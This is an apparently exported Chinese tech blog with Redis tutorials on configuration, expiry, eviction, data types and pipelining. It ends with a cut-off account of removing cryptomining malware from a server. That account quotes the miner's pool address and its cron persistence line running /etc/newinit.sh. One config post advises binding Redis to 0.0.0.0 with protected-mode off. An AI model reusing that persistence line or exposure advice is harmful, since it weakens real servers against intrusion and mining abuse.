<p>1，配置redis访问密码，只需要修改<code>redis.conf</code>的<code>requirepass</code>参数即可。<br>设置redis访问密码: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">requirepass &lt;密码&gt;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>2，配置守护进程启动，同样在<code>redis.conf</code>文件中修改<code>daemonize yes</code>即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">daemonize yes</span><br></pre></td></tr></table></figure>
<p> <br>3，最大内存设置，默认是注释的，单位是<code>byte</code>字节，如果超出这个最大限制，Redis会根据<code>逐出策略</code>尝试删除KEY，如果配置的是不逐出任何内容的策略，那么将直接提示写操作错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory &lt;bytes&gt;</span><br></pre></td></tr></table></figure>
<p>逐出策略配置方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory-policy &lt;策略&gt;</span><br></pre></td></tr></table></figure>
<p>可选策略：</p>
<table>
<thead>
<tr>
<th>策略名称</th>
<th>策略描述</th>
</tr>
</thead>
<tbody><tr>
<td>volatile-lru</td>
<td>仅限设置了失效时间的KEY，最久没有使用的</td>
</tr>
<tr>
<td>allkeys-lru</td>
<td>针对所有的KEY，最久没有使用的</td>
</tr>
<tr>
<td>volatile-lfu</td>
<td>仅限设置了失效时间的KEY，逐出使用频率最少的</td>
</tr>
<tr>
<td>allkeys-lfu</td>
<td>针对所有的KEY，逐出使用频率最少的</td>
</tr>
<tr>
<td>volatile-random</td>
<td>仅限设置了失效时间的KEY，随机逐出</td>
</tr>
<tr>
<td>allkeys-random</td>
<td>针对所有的KEY，随机逐出</td>
</tr>
<tr>
<td>volatile-ttl</td>
<td>仅限设置了失效时间的KEY，且优先逐出有效时间最短的(TTL)</td>
</tr>
<tr>
<td>noeviction</td>
<td>默认，不逐出任何内容，只返回一个写操作错误。</td>
</tr>
</tbody></table>
<p>4，配置访问限制，设置<code>bind</code>为<code>0.0.0.0</code>，并设置<code>protected-mode</code>为<code>no</code>使其bind生效，这样所有ip都可以访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">protected-mode no</span><br></pre></td></tr></table></figure>
<p> <br>5，配置数据持久化方式，Redis在默认情况下是异步写入磁盘，所以断电可能会导致部分写操作丢失，所以一般情况下我们是开启AOF持久方式，将<code>appendonly</code>参数配置为<code>yes</code>即可，至于AOF和RDB两种方式的具体规则和区别，后续文章中会进行详细介绍。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<h5 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h5><p>1，启动redis服务，只需要借助<code>redis-server</code>即可，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/redis/bin/redis-server /usr/<span class="built_in">local</span>/redis/bin/redis.conf</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-专栏目录</title>
    <url>/2020/10/01/redis-0-catalog/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Redis的一些笔记和相关知识点，还在2014年刚接触的时候，就开始写成一些文章汇总到以前的博客里面。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;长时间没有去整理，久而久之，就变得非常的 零散、杂乱，不利于查阅和总结。所以，也趁迁移博客的机会，重新将相关内容汇总梳理了一番，并结合Redis官方文档的翻译，归纳在一起形成一个专栏[偷笑]。</p>
<h4 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a>目录列表</h4><ul>
<li><a href="https://32e.co/2020/10/01/redis-data-types-intro">Redis专栏-基本数据类型介绍</a></li>
<li><a href="https://32e.co/2020/10/01/redis-pipelining">Redis专栏-使用管道加速请求</a></li>
<li><a href="https://32e.co/2020/10/01/redis-pub-sub">Redis专栏-发布与订阅</a></li>
<li><a href="https://32e.co/2020/10/01/redis-lua-script">Redis专栏-Lua脚本应用</a></li>
<li><a href="https://32e.co/2020/10/01/redis-memory-optimization">Redis专栏-内存优化</a></li>
<li><a href="https://32e.co/2020/10/01/redis-expire">Redis专栏-Key的过期策略</a></li>
<li><a href="https://32e.co/2020/10/01/redis-maxmemory-policy">Redis专栏-内存淘汰策略</a></li>
<li><a href="">Redis专栏-Redis事务的原理</a></li>
<li><a href="">Redis专栏-批量插入数据的最佳实践</a></li>
<li><a href="">Redis专栏-分布式锁</a></li>
<li><a href="">Redis专栏-数据分区的实现</a></li>
<li><a href="">Redis专栏-内存碎片</a></li>
<li><a href="">Redis专栏-认识Redis Stream(流)</a></li>
<li><a href="">Redis专栏-键空间通知</a></li>
<li><a href="">Redis专栏-模块编程</a></li>
<li><a href="">Redis专栏-掌握Redis-cli命令行工具</a></li>
<li><a href="">Redis专栏-主副本复制的相关知识</a></li>
<li><a href="">Redis专栏-数据持久的两种方式</a></li>
<li><a href="">Redis专栏-安全性</a></li>
<li><a href="">Redis专栏-访问控制配置</a></li>
<li><a href="">Redis专栏-客户端与服务器的通信加密</a></li>
<li><a href="">Redis专栏-信号处理</a></li>
<li><a href="">Redis专栏-延迟监控框架</a></li>
<li><a href="https://32e.co/2020/10/01/redis-sign-install">Redis专栏-单机部署Redis</a></li>
<li><a href="https://32e.co/2020/10/01/redis-docker-install">Redis专栏-Docker部署Redis</a></li>
<li><a href="">Redis专栏-高可用方案-哨兵模式(Redis-Sentinel)</a></li>
<li><a href="">Redis专栏-如何搭建Redis集群</a></li>
<li><a href="">Redis专栏-使用create-cluster脚本创建集群</a></li>
<li><a href="">Redis专栏-在Docker容器环境中搭建集群</a></li>
<li><a href="">Redis专栏-集群的主从模型和数据分片</a></li>
<li><a href="">Redis专栏-Redis群集一致性保证</a></li>
</ul>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-Key的过期策略</title>
    <url>/2020/10/01/redis-expire/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Redis可以通过<code>expire</code>/<code>pexpire</code>给每个Key设置不同的生存时间，超时到期后，Key将自动删除。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;只有<code>删除</code>或<code>覆盖</code>等相关命令才能清除这个超时设置，如：<code>del</code>、 <code>set</code>。当然，也可以通过<code>persist</code>命令移除Key的expire设置，将Key重新设置为永久有效。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Redis还提供了<code>rename</code>命令，可以将Key修改为其他名称，不过，这个操作仍然不会影响<code>expire</code>的设置。</p>
<h4 id="过期信息的存储"><a href="#过期信息的存储" class="headerlink" title="过期信息的存储"></a>过期信息的存储</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Key过期信息是存储的<code>Unix绝对时间戳</code>（版本&gt;=2.6以<code>毫秒</code>为单位），<br>所以，过期时间的值与Redis服务是否在运行没有直接关系，与机器的系统时间有的直接关系，因为时间不会因为服务停止而停止向前。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;这个机制也存在一个问题，如果你迁移RDB文件到其他的服务器上，而这两台服务器的系统时间相差较大，那么就会导致Key提前到期，或延迟到期。</p>
<h4 id="过期密钥的方式"><a href="#过期密钥的方式" class="headerlink" title="过期密钥的方式"></a>过期密钥的方式</h4><p>Redis的Key有两种过期方式：</p>
<ul>
<li>被动方式</li>
<li>主动方式</li>
</ul>
<h4 id="触发过期的时机"><a href="#触发过期的时机" class="headerlink" title="触发过期的时机"></a>触发过期的时机</h4><h5 id="1，被动方式："><a href="#1，被动方式：" class="headerlink" title="1，被动方式："></a><code>1，被动方式：</code></h5><p>&nbsp;&nbsp;&nbsp;&nbsp;仅当客户端尝试访问Key时，Key才会检测失效时间，从而被动失效。</p>
<h5 id="2，主动方式："><a href="#2，主动方式：" class="headerlink" title="2，主动方式："></a><code>2，主动方式：</code></h5><p>&nbsp;&nbsp;&nbsp;&nbsp;因为有的Key可能永远不会再次访问，所以被动方式显然不能满足。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;因此Redis会定期对具有设置了<code>expire</code>的Key，进行随机的检测，检测到失效，就直接删除失效Key。</p>
<p>具体实现逻辑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Redis 每秒执行10次 的随机检测操作：</span><br><span class="line">     1，从一组设置了过期的密钥中随机选择20个Key</span><br><span class="line">     2，删除其中已经达到过期时间的Key</span><br><span class="line">     3，如果这一组key中有超过25％的密钥已过期，那么再次从&#96;步骤1&#96;开始执行</span><br></pre></td></tr></table></figure>
<p>注：这个实现逻辑是一个概率算法，它假设我们随机取的这一组样本，可以代表整个Redis空间，持续不断的检测，直到可能过期的Key所占百分比低于25％。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-内存淘汰策略</title>
    <url>/2020/10/01/redis-maxmemory-policy/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;作为一台服务器，它的内存肯定是有上限的，Redis是内存数据库，大量的数据保存在内存中，当内存空间达到瓶颈，超出了物理内存的上限时，就会导致内存操作频繁与磁盘进行交换，从而导致性能产生断崖式是下滑。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;内存中保存的数据，大量的Key应该都并不是有用的，所以淘汰它们，释放所占空间，可以极大的提供内存的可使用量。</p>
<h3 id="内存淘汰设置"><a href="#内存淘汰设置" class="headerlink" title="内存淘汰设置"></a>内存淘汰设置</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;Redis的内存淘汰策略与<code>redis.conf</code>中配置的 <code>maxmemory</code>和 <code>maxmemory-policy</code>息息相关。</p>
<h4 id="maxmemory-最大内存设置"><a href="#maxmemory-最大内存设置" class="headerlink" title="maxmemory(最大内存设置)"></a>maxmemory(最大内存设置)</h4><p>最大内存设置，默认是注释的，表示不做任何限制，单位是<code>byte</code>字节。如果内存超出这个最大限制，Redis会根据配置的淘汰策略删除其他的KEY。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory &lt;bytes&gt;</span><br></pre></td></tr></table></figure>


<h4 id="maxmemory-policy-内存淘汰策略"><a href="#maxmemory-policy-内存淘汰策略" class="headerlink" title="maxmemory-policy(内存淘汰策略)"></a>maxmemory-policy(内存淘汰策略)</h4><p>内存达到<code>maxmemory</code>上限的时候，触发的淘汰策略，默认使用的策略为：<code>noeviction</code>，即不做任何处理，这种情况，会直接提示写操作错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory-policy &lt;策略&gt;</span><br></pre></td></tr></table></figure>
<p>注意：无论配置的是什么策略，都有可能不满足，所以，当没有合适的Key被逐出时，Redis都会在写入时返回操作错误</p>
<h3 id="支持的淘汰策略"><a href="#支持的淘汰策略" class="headerlink" title="支持的淘汰策略"></a>支持的淘汰策略</h3><table>
<thead>
<tr>
<th>策略名称</th>
<th>策略描述</th>
</tr>
</thead>
<tbody><tr>
<td>volatile-lru</td>
<td>仅限设置了失效时间的KEY，最近最少使用的</td>
</tr>
<tr>
<td>allkeys-lru</td>
<td>针对所有的KEY，最近最少使用的</td>
</tr>
<tr>
<td>volatile-lfu</td>
<td>仅限设置了失效时间的KEY，逐出使用频率最低的</td>
</tr>
<tr>
<td>allkeys-lfu</td>
<td>针对所有的KEY，逐出使用频率最低的</td>
</tr>
<tr>
<td>volatile-random</td>
<td>仅限设置了失效时间的KEY，随机逐出</td>
</tr>
<tr>
<td>allkeys-random</td>
<td>针对所有的KEY，随机逐出</td>
</tr>
<tr>
<td>volatile-ttl</td>
<td>仅限设置了失效时间的KEY，且优先逐出有效时间最短的(TTL)</td>
</tr>
<tr>
<td>noeviction</td>
<td>默认，不逐出任何内容，只返回一个写操作错误。</td>
</tr>
</tbody></table>
<p>注：以上所有策略都不是精确算法，而是近似算法，这样做的目的是为了节省内存。</p>
<p>而且，可以通过<code>maxmemory-samples</code>参数来调整它的速度或准确度，默认值为：5，表示Redis将检查5个Key并选择一个是最符合逐出条件的key。</p>
<p>值越大，检测精准度越高，但速度就越慢。正常来说，建议默认5个效果比较居中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory-samples 5</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
        <tag>淘汰策略</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-基本数据类型介绍</title>
    <url>/2020/10/01/redis-data-types-intro/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;Redis不仅仅是简单的键值对存储服务，它是一个支持 多种不同类型数据结构 数据的服务器。</p>
<p>它目前支持的数据类型：</p>
<ul>
<li>Binary-safe String： 二进制安全字符串</li>
<li>List： 列表</li>
<li>Set： 集合</li>
<li>Sorted Set： 有序集合</li>
<li>Hash： 哈希</li>
<li>Bit Array：位数组，String的扩展</li>
<li>HyperLogLogs：概率数据结构</li>
<li>Stream：流</li>
</ul>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="Binary-safe-String-二进制安全字符串"><a href="#Binary-safe-String-二进制安全字符串" class="headerlink" title="Binary-safe String(二进制安全字符串)"></a>Binary-safe String(二进制安全字符串)</h4><p>String是Redis最基本、最简单的数据类型，它允许的最大密钥大小为<code>512MB</code>，同时，值也不能大于<code>512MB</code>，不过建议不要设置太长的key或value，否则它会给你带来巨大的内存开销。</p>
<p>同时，它是二进制安全的，所以它可以存储包括字符串在内的任何数据。</p>
<p>什么是二进制安全？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二进制安全功能（函数）是指在一个二进制文件上所执行的不更改文件内容的功能或者操作，</span><br><span class="line">其本质上将操作输入作为原始的、无任何特殊格式意义的数据流，它保证了二进制数据的信息安全。</span><br></pre></td></tr></table></figure>
<p>注：<code>SET</code>和<code>GET</code>命令是我们设置和检索字符串值的方式</p>
<p>奇异的<code>incr</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">看到这里，大家可能会疑惑了，我们在使用 incr&#x2F;get 命令的时候，明明就是整型的数字啊！</span><br><span class="line"></span><br><span class="line">因为Redis并没有整数类型，所以，INCR命令在执行的时候，会将字符串解析为一个整数，达到整型的效果。</span><br></pre></td></tr></table></figure>

<h4 id="List-列表"><a href="#List-列表" class="headerlink" title="List(列表)"></a>List(列表)</h4><p>List是字符串元素的<code>有序</code>集合，通过<code>链表</code>实现，按照插入的顺序排序，元素<code>可重复</code>。</p>
<p>链表（Linked list）是一种线性表，是很常见的基础数据结构，在每一个节点里存到下一个节点的指针，由于不必按顺序存储。</p>
<p>所以链表在插入的时候可以达到O(1)的复杂度，无论你在 1万 还是 1千万 的列表中，在其 左侧 或 右侧 添加元素的速度都是 非常快的、相同的。</p>
<p>但是访问速度不是那么快了，查找一个节点或者访问特定编号的节点则需要O(n)的时间，特别是LRANGE命令，查询时间复杂度：O(S+N)， S 为偏移量 start ， N 为指定区间内元素的数量，时间复杂度与所访问元素的索引量成正比。</p>
<p>常用的相关命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>LPUSH/RPUSH</td>
<td>将一个新元素到列表的左侧（头部）/右侧（尾部）</td>
</tr>
<tr>
<td>LRANGE</td>
<td>从列表中提取指定范围的元素</td>
</tr>
<tr>
<td>LPOP/RPOP</td>
<td>返回并移除列表左侧（头部）/右侧（尾部）的元素</td>
</tr>
<tr>
<td>LTRIM</td>
<td>修剪指定范围的列表，让列表只保留指定范围的元素</td>
</tr>
<tr>
<td>LLEN</td>
<td>获取列表的元素数量</td>
</tr>
</tbody></table>
<p>适合的使用的场景：</p>
<ul>
<li>作为消息队列</li>
<li>浏览足迹</li>
</ul>
<h4 id="Set-集合"><a href="#Set-集合" class="headerlink" title="Set(集合)"></a>Set(集合)</h4><p>Set是字符串元素的<code>无序</code>集合，通过<code>哈希表</code>实现，元素<code>不可重复</code>。</p>
<p>它的 添加、删除、查找 的复杂度都是 O(1)。</p>
<p>何为哈希表？</p>
<p>哈希表(Hash table)也被叫做散列表，它通过计算一个键值的映射函数(散列函数)，将键（Key）映射到表中的一个位置，从而直接访问数据储存位置的数据结构，能带来极高的查询速度。</p>
<p>哈希算法是一种摘要算法，不同的数据产生定长的摘要，所以会产生碰撞冲突，为了解决数据冲突，会采用<code>单独链表法</code>将散列到同一个存储位置的所有元素保存在一个链表中。</p>
<h4 id="Sorted-Set-有序集合"><a href="#Sorted-Set-有序集合" class="headerlink" title="Sorted Set(有序集合)"></a>Sorted Set(有序集合)</h4><p>有序集合和集合Set的特性基本相同，唯一的区别在于它是有序的。</p>
<p>每个字符串元素都与<code>score</code>这个浮点数字值相关联。这个值就是它排序的分值(分值可以相同)，根据这个分值实现元素的升序或降序排列。</p>
<p>适合的使用的场景：</p>
<ul>
<li>排行榜</li>
<li>商品推荐</li>
</ul>
<h4 id="Hash-哈希"><a href="#Hash-哈希" class="headerlink" title="Hash(哈希)"></a>Hash(哈希)</h4><p>Hash是一个由 <code>字段</code> 和 <code>值</code> 组成的映射表，也就是一个个<code>键值对</code>，字段和值都是字符串类型，你可以把它想象成Java里的HashMap&lt;String,String&gt;，一个Key对应一个HashMap。</p>
<p>相对单独使用 键值对 保存数据而言，使用Hash类型来存储，更加节省空间。</p>
<p>适合的使用的场景：</p>
<ul>
<li>购物车</li>
<li>对象属性信息</li>
</ul>
<h4 id="Bit-Array-位数组"><a href="#Bit-Array-位数组" class="headerlink" title="Bit Array(位数组)"></a>Bit Array(位数组)</h4><p>Bit Array不是实际的数据类型，而是在String类型上定义的一组面向位的操作，所以可以说它是String类型的一种扩展。</p>
<p>由于字符串是二进制安全，并且最大长度为512 MB，因此它们适合设置多达 2的32次方 个不同的字节。</p>
<p>Bit Array就是一个长度可变的bit数组，每个位只能存储0或1。</p>
<p>位操作分为两类：</p>
<ul>
<li>1，对单个位操作，把字段的某个位设置为 0或1</li>
<li>2，对给定的位范围内，统计其设置的位(0或1)的数量</li>
</ul>
<p>所以，它的最大优点是：在存储信息时可以节省大量空间，例如，在以增量用户ID表示不同用户的系统中，仅使用512MB内存就可以记住40亿用户的位信息</p>
<p>适合的使用的场景：</p>
<ul>
<li>数据去重</li>
</ul>
<h4 id="HyperLogLogs-概率数据结构"><a href="#HyperLogLogs-概率数据结构" class="headerlink" title="HyperLogLogs(概率数据结构)"></a>HyperLogLogs(概率数据结构)</h4><p>HyperLogLogs是一种概率数据结构，用于对唯一元素进行计数（这里指集合的基数），它存在一定误差，但误差小于1％。</p>
<p>通常，对唯一元素进行计数需要保存元素本身，并使用与要计数的元素数量成比例的内存量。</p>
<p>而HyperLogLogs只需根据输入元素来计算基数，而不会储存输入元素本身，所以，无论元素的数量和体积有多大，计算基数所需的内存空间都是固定不变的，并且是很小，每个Key的占用内存不会超过12KB。</p>
<p>这个特性造就了它的价值，当然也丧失了获取元素的能力，不过获取元素的能力也不需要，所以根本不care。</p>
<p>相关命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>pfadd</td>
<td>添加一个或多个元素</td>
<td><code>pfadd k a b c </code></td>
</tr>
<tr>
<td>pfcount</td>
<td>获取Key的基数估算值</td>
<td><code>pfcount k</code></td>
</tr>
<tr>
<td>pfmerge</td>
<td>合并多个Key到一个新Key，如：将<code>k1</code>与<code>k2</code>合并到<code>newk</code></td>
<td><code>pfmerge newk  k1 k2</code></td>
</tr>
</tbody></table>
<p>示例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">redis0&gt;</span> <span class="string">pfadd</span> <span class="string">k</span> <span class="string">a</span> <span class="string">b</span> <span class="string">c</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="string">redis0&gt;</span> <span class="string">pfadd</span> <span class="string">k</span> <span class="string">c</span> <span class="string">d</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="string">redis0&gt;</span> <span class="string">pfcount</span> <span class="string">k</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>适合使用的场景：</p>
<ul>
<li>记录网站访问量、PV、UV之类的数据</li>
</ul>
<h4 id="Stream-流"><a href="#Stream-流" class="headerlink" title="Stream(流)"></a>Stream(流)</h4><p>Stream是Redis 5.0引入的新数据类型，它就像日志文件一样，仅以追加模式添加数据。</p>
<p>流与列表没有太大不同，只是附加的API更复杂，功能更强大。</p>
<p>它非常适合作为消息系统来使用，虽然 Redis 本身提供了发布订阅 (pub/sub) 来实现消息队列的功能，但是以前的发布订阅功能是有缺陷的，消息无法持久化，如果出现网络断开、Redis宕机等，消息就会被丢弃。</p>
<p>Stream流的工作方式截然不同，所有消息都将无限期保留在流中，除非用户明确要求删除，并且，丰富的API足以支撑整个消息系统的功能。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-使用管道加速请求</title>
    <url>/2020/10/01/redis-pipelining/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>大家都在说Redis很快！没错！非常快！但你真的感受到它的快了吗？尤其在高并发或极差网络环境的情况下，真的快了吗？你用对了吗？</p>
<p>在讨论这些问题之前，我们需要先来了解一下什么是<code>RTT</code>，以及RTT带来的影响。</p>
<h4 id="什么是RTT？"><a href="#什么是RTT？" class="headerlink" title="什么是RTT？"></a>什么是RTT？</h4><p>一个TCP请求经历的步骤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1，客户端向服务器发送请求，并以阻塞的方式从套接字中读取服务器的响应。</span><br><span class="line">2，服务器接收到请求，处理命令并将响应发送回客户端。</span><br><span class="line"></span><br><span class="line">注：套接字是通信的基石，是支持TCP&#x2F;IP协议的路通信的基本操作单元。 --来自百度百科</span><br></pre></td></tr></table></figure>
<p>客户端和服务器通过网络链接进行连接，这样的链接可能非常快（环回接口：本机内的请求），也可能非常慢（通过网络连接的两台主机，它们之间可能存在很多跃点）。无论网络快慢，请求都会有一段等待时间（即：从客户端传输到服务器，再由服务器传输回客户端消耗的时间），这段时间称为 <code>RTT（请求往返时间）</code>。</p>
<p>而Redis的通讯，就是建立在TCP之上的，它就是典型的使用<code>客户端-服务器</code>交互模型进行请求响应的TCP服务器，所以<code>RTT</code>直接影响到它的每一个请求。</p>
<p>试想一下，如果我们的Redis服务器的 RTT时间 为200毫秒，那么即使服务器每秒有处理10万个请求的能力，但是在这个网络环境下，它每秒最多也只能处理5个请求。</p>
<p>那么到现在，你还认为它快吗？先别急着否定，这毕竟是受到了 网络因素的影响。下面我们就来看看，Redis有什么办法在这样的网络环境下，提升请求速度！</p>
<h4 id="Redis管道"><a href="#Redis管道" class="headerlink" title="Redis管道"></a>Redis管道</h4><p>解决问题的思路？导致问题的根源是RTT，没有办法干预RTT的时候，如何在一个请求中处理更多的命令就是它的优化方向。</p>
<p>解决这个问题的技术已经非常的成熟，业界也有大量技术正在使用它，它就是pipelining流水线(管道)技术，它的出现 有效的解决了单个请求的成本问题，Redis也从很早就开始支持管道传输。</p>
<p>下面我们看看，如何在Redis中使用管道。</p>
<h5 id="Redis管道示例"><a href="#Redis管道示例" class="headerlink" title="Redis管道示例"></a>Redis管道示例</h5><p>如下示例使用Jedis客户端：</p>
<p>代码示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建连接</span></span><br><span class="line">        Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;k.32e.co&quot;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 普通调用</span></span><br><span class="line">        <span class="keyword">long</span> t1 = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">500</span> ; i ++)&#123;</span><br><span class="line">            jedis.set(<span class="string">&quot;test:&quot;</span> + i,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Jedis耗时：&quot;</span> + (System.currentTimeMillis() - t1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过管道调用</span></span><br><span class="line">        <span class="keyword">long</span> t2 = System.currentTimeMillis();</span><br><span class="line">        Pipeline pipeline = jedis.pipelined();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">500</span> ; i ++)&#123;</span><br><span class="line">            pipeline.set(<span class="string">&quot;test2:&quot;</span> + i,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pipeline.sync();</span><br><span class="line">        System.out.println(<span class="string">&quot;Jedis Pipeline耗时：&quot;</span> + (System.currentTimeMillis() - t2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>耗时输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jedis耗时：11314</span><br><span class="line">Jedis Pipeline耗时：51</span><br></pre></td></tr></table></figure>
<p>如上示例，我们看到 正常执行 和 通过管道执行 大量的命令时，它们两者之间的耗时整整相差了百倍不止。所以在合适的场合下，合理使用管道命令 能非常有效的加快Redis命令处理速度，有效的提高程序性能。</p>
<p>不过，虽然管道能够帮我们批量处理大量的命令，但是，美酒虽好，可不要贪杯哟！因为管道里的命令在服务器上执行的时候，是需要在内存中排队执行的，所以最好不要塞的太多哦。</p>
<h5 id="管道之外的方法"><a href="#管道之外的方法" class="headerlink" title="管道之外的方法"></a>管道之外的方法</h5><p>Redis除了支持<code>Pipeline</code>之外，它还支持<code>Lua</code>脚本，我们可以使用Lua编写一个脚本，将多个Redis命令放在一起执行，达到同样的效果。</p>
<p>那么我们要如何选择呢？它们之间有什么区别呢？</p>
<p>我们看看下面这个表格：</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>Pipeline</th>
<th>Lua</th>
</tr>
</thead>
<tbody><tr>
<td>批量执行命令</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>保证原子性</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr>
<td>干预命令执行逻辑</td>
<td>不支持</td>
<td>支持</td>
</tr>
</tbody></table>
<p>整体来说，Lua脚本更加的灵活，因为是脚本，所以你可以随心所欲的控制各个命令之间的执行逻辑，以及处理它们之间的依赖关系。更重要的是，Lua是保证原子性的，所以在一些特定场景，只有它才能胜任。而Pipeline管道，更多的是为了解决RTT带来的问题。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
        <tag>管道</tag>
      </tags>
  </entry>
  <entry>
    <title>机器被挖矿！怎么解？</title>
    <url>/2021/02/09/linux-kill-mining-attack/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天上午，突然发现ECS上的一些服务无法访问，而能访问的，请求响应也很慢，回想了一下，好像也没跑什么能使内存或cpu暴涨的程序啊。<br>于是，立马抄上我的二手mac登录服务器，好家伙，发现部分进程被杀死，cpu也飙了到100%，绝逼是被植入了恶意木马呀。</p>
<p>执行<code>htop</code>一看，便发现了这个恶意进程，根据进程的command信息找到了一些关键内容：<code>stratum+tcp://xmr-asia1.nanopool.org:14444</code>，这尼玛不就是矿池地址吗，看来是被植入了挖矿木马，成了人家的免费劳动力啊。</p>
<h3 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h3><p>知道问题原因后，解决起来就很容易了，首先看看有没有恶意的定时任务，先消灭掉，否则查杀进程起不了什么作用，消停一会就换个进程继续上演了。</p>
<p>1，到/var/spool/cron目录，查看定时任务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/spool/cron</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>发现多了一个root文件，<code>cat root</code>看了下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;30 * * * * sh &#x2F;etc&#x2F;newinit.sh &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>任务内容：每30秒，运行一次/etc/newinit.sh脚本</p>
<p><code>sudo rm -rf root</code>:权限不足！呵呵，不急，应该是被设置来锁定属性来，一会再来收拾它。</p>
